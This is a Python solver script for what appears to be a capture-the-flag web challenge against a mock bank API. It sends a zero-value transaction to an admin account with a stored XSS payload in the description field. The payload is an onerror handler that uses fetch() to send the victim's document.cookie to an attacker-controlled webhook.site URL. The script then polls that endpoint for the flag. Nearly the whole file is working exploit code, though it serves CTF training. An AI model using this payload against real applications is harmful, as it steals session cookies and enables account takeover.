import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite_uuid = self.get_webhooksite_uuid()
        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
        self.webhooksite_view_url = f"https://webhook.site/#!/view/{self.webhooksite_uuid}"
        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"
        print(self.webhooksite_view_url)

    def get_webhooksite_uuid(self):
        response = self.session.post("https://webhook.site/token")
        return response.json()["uuid"]

    def find_flag_webhooksite(self, delay_seconds=3):
        import time, json
        time.sleep(delay_seconds)
        response = self.session.get(self.webhooksite_requests_url)
        response_json = response.json()
        response_json_text = json.dumps(response_json, indent=2)
        find_flag(response_json_text)

    def main(self):
        API_BASE_URL = "https://api.netquocca.quoccacorp.com"

        response = self.session.get(f"{API_BASE_URL}/accounts")
        my_account = response.json()["accounts"][0]
        my_bsb, my_account_number = my_account["bsb"], my_account["account_number"]

        ADMIN_BSB = "069-420"
        ADMIN_ACCOUNT_NUMBER = "00000000"

        PAYLOAD = f'''![x]("onerror="fetch(`{self.webhooksite_url}?q=${{document.cookie}}`))'''

        self.session.post(f"{API_BASE_URL}/transactions", json={
            "from_account": { "bsb": my_bsb, "account_number": my_account_number },
            "to_account": { "bsb": ADMIN_BSB, "account_number": ADMIN_ACCOUNT_NUMBER },
            "description": PAYLOAD,
            "amount": 0.01
        })

        self.find_flag_webhooksite()

if __name__ == "__main__":
    Solver().main()
